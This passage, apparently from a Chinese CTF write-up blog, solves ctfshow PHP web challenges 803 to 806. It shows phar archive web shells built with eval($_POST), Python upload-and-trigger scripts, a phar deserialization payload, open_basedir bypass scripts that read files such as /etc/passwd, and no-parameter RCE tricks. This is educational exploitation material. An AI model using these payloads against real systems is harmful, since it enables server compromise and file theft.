class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !preg_match(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题通过构建phar包进行文件上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;a.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;&lt;?php eval(\$_POST[a]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用上述脚本构建phar文件<br>之后进行文件上传<br>这里有两种解法<br>一种是利用bp进行文件上传<br>（由于不知道什么原因，我利用bp一直无法上传成功，就利用python上传）<br>于是用第二种-&gt;脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://04608b57-c254-475c-ae94-804018955038.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;a.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar/test&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>得到flag</p><h1 id="web-804-phar反序列化"><a href="#web-804-phar反序列化" class="headerlink" title="web 804(phar反序列化)"></a>web 804(phar反序列化)</h1><p>phar反序列化<br><img src="https://img-blog.csdnimg.cn/f87361fd11c849419e66a6fdbbebe3ae.png"><br>从中可以看出phar中包含metdata便可触发序列化<br><img src="https://img-blog.csdnimg.cn/48e046d85d994531a9bcd06c8c8311e9.png"><br>通过大佬的讲解  得到下面结论<br><img src="https://img-blog.csdnimg.cn/e5d79e04be174b3eb5230eb38a37078d.png"><br>可以利用使其反序列化的一些函数<br><img src="https://img-blog.csdnimg.cn/02f373cc8d394a2b935783607f4362da.png"><br><img src="https://img-blog.csdnimg.cn/f0c15dbaf81f4cba8673a459a2bb8efd.png"><br>于是解决本题可以利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> hacker();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到phar文件<br>之后上传phar文件并将其利用phar伪协议进行打开触发反序列化即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>也可利用bp  但是由于自身原因导致bp文件无法正常传输</p><h1 id="web805（open-basedir绕过）"><a href="#web805（open-basedir绕过）" class="headerlink" title="web805（open_basedir绕过）"></a>web805（open_basedir绕过）</h1><blockquote><p>open_basedir 的作用就是指定目录位置了,意思是将PHP<br>所能打开的文件限制在指定的目录树,包括文件本身了,并且不受是不是安全模式的影响.</p></blockquote><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>方式1—DirectoryIterator+glob://<br>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。<br>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;glob:///*&quot;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f01eb4dfb8fe448891f81604c3a73d9a.png"><br>方式2——opendir()+readdir()+glob://<br>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = opendir(<span class="variable">$a</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = readdir(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。<br>利用p神脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&#x27;content-type: text/plain&#x27;</span>);</span><br><span class="line">error_reporting(-<span class="number">1</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s\nphp_version: %s\n&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>), phpversion());</span><br><span class="line">printf(<span class="string">&quot;disable_functions: %s\n&quot;</span>, ini_get(<span class="string">&#x27;disable_functions&#x27;</span>));</span><br><span class="line"><span class="variable">$file</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="variable">$relat_file</span> = getRelativePath(<span class="keyword">__FILE__</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$name</span> = mt_rand() % <span class="number">999</span>;</span><br><span class="line"><span class="variable">$exp</span> = getRandStr();</span><br><span class="line">mkdir(<span class="variable">$name</span>);</span><br><span class="line">chdir(<span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span> ; <span class="variable">$i</span> &lt; count(<span class="variable">$paths</span>) - <span class="number">1</span> ; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    mkdir(<span class="variable">$paths</span>[<span class="variable">$i</span>]);</span><br><span class="line">    chdir(<span class="variable">$paths</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir(<span class="variable">$paths</span>[<span class="variable">$i</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> -= <span class="number">1</span>; <span class="variable">$i</span> &gt; <span class="number">0</span>; <span class="variable">$i</span>--) &#123; </span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$relat_file</span>);</span><br><span class="line"><span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$paths</span>[<span class="variable">$i</span>] == <span class="string">&#x27;..&#x27;</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    mkdir(<span class="variable">$name</span>);</span><br><span class="line">    chdir(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$j</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="variable">$j</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tmp</span> = array_fill(<span class="number">0</span>, <span class="variable">$j</span> + <span class="number">1</span>, <span class="variable">$name</span>);</span><br><span class="line">symlink(implode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$tmp</span>), <span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line"><span class="variable">$tmp</span> = array_fill(<span class="number">0</span>, <span class="variable">$j</span>, <span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">symlink(<span class="string">&#x27;tmplink/&#x27;</span> . implode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$tmp</span>) . <span class="variable">$file</span>, <span class="variable">$exp</span>);</span><br><span class="line">unlink(<span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line">mkdir(<span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line">delfile(<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$exp</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]) . <span class="string">&quot;/<span class="subst">&#123;$exp&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&quot;http://<span class="subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span><span class="subst">&#123;$exp&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n-----------------content---------------\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$exp</span>);</span><br><span class="line">delfile(<span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span>(<span class="params"><span class="variable">$from</span>, <span class="variable">$to</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  <span class="variable">$from</span> = rtrim(<span class="variable">$from</span>, <span class="string">&#x27;\/&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">  <span class="variable">$from</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$from</span>);</span><br><span class="line">  <span class="variable">$to</span>   = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$to</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$from</span>   = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$from</span>);</span><br><span class="line">  <span class="variable">$to</span>     = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$to</span>);</span><br><span class="line">  <span class="variable">$relPath</span>  = <span class="variable">$to</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$from</span> <span class="keyword">as</span> <span class="variable">$depth</span> =&gt; <span class="variable">$dir</span>) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="variable">$to</span>[<span class="variable">$depth</span>]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift(<span class="variable">$relPath</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      <span class="variable">$remaining</span> = count(<span class="variable">$from</span>) - <span class="variable">$depth</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$remaining</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        <span class="variable">$padLength</span> = (count(<span class="variable">$relPath</span>) + <span class="variable">$remaining</span> - <span class="number">1</span>) * -<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$relPath</span> = array_pad(<span class="variable">$relPath</span>, <span class="variable">$padLength</span>, <span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$relPath</span>[<span class="number">0</span>] = <span class="string">&#x27;./&#x27;</span> . <span class="variable">$relPath</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$relPath</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span>(<span class="params"><span class="variable">$deldir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file(<span class="variable">$deldir</span>)) &#123;</span><br><span class="line">        @chmod(<span class="variable">$deldir</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink(<span class="variable">$deldir</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir(<span class="variable">$deldir</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="variable">$mydir</span> = @opendir(<span class="variable">$deldir</span>)) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">false</span> !== (<span class="variable">$file</span> = @readdir(<span class="variable">$mydir</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$name</span> = File_Str(<span class="variable">$deldir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">if</span>((<span class="variable">$file</span>!=<span class="string">&#x27;.&#x27;</span>) &amp;&amp; (<span class="variable">$file</span>!=<span class="string">&#x27;..&#x27;</span>))&#123;delfile(<span class="variable">$name</span>);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir(<span class="variable">$mydir</span>);</span><br><span class="line">        @chmod(<span class="variable">$deldir</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir(<span class="variable">$deldir</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;//&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$string</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">6</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= substr(<span class="variable">$chars</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要利用文件包含<br><img src="https://img-blog.csdnimg.cn/af44c6db5886430982ddc3966a861474.png"><br>也可以利用利用chdir()与ini_set()组合Bypass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">// 获取当前目录</span></span><br><span class="line"><span class="keyword">echo</span> getcwd() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变目录</span></span><br><span class="line">chdir(<span class="string">&quot;images&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得当前目录</span></span><br><span class="line"><span class="keyword">echo</span> getcwd();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果：</span><br><span class="line"></span><br><span class="line">/home/php</span><br><span class="line">/home/php/images</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/ctfshowflag&quot;</span>);</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_45669205/article/details/116078744">chdir()与ini_set()组合详解</a><br><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">open_basedir绕过</a></p><h1 id="web806（无参rce）"><a href="#web806（无参rce）" class="headerlink" title="web806（无参rce）"></a>web806（无参rce）</h1><h2 id="利用session-id"><a href="#利用session-id" class="headerlink" title="利用session_id"></a>利用session_id</h2><p>php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () ‘，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> bin2hex(<span class="string">&#x27;phpinfo();&#x27;</span>);  <span class="comment">//706870696e666f28293b</span></span><br></pre></td></tr></table></figure><p>但是呢，session_id的使用需要开启session，所以需要session_start()函数<br>hex2bin(session_id(session_start()))<br>但是呢，仅仅一个eval执行上面代码只会把十六进制转换成字符串’phpinfo();’,所以我们还需要一个eval<br>最终<br><img src="https://img-blog.csdnimg.cn/109de13201aa4498ba456b524c137a2a.png"><br>由于806的php版本为7 则无法利用这个姿势</p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>利用var_dump(getallheaders());获取位置信息<br><img src="https://img-blog.csdnimg.cn/cf670d92d5894db9850a13b7b1a08840.png"><br>之后通过修改相应位置的信息进行命令执行<br>这两个命令执行效果相同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(current(getallheaders()));</span><br><span class="line"><span class="keyword">eval</span>(end(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/307ccab6b4fb43cdaf7e0797f8a49d94.png"><br><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">大佬博客</a></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>get_defined_vars()：返回由所有已定义变量所组成的数组<br>该命令 上面博客已写<br>也可利用群主师傅的命令随机碰撞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 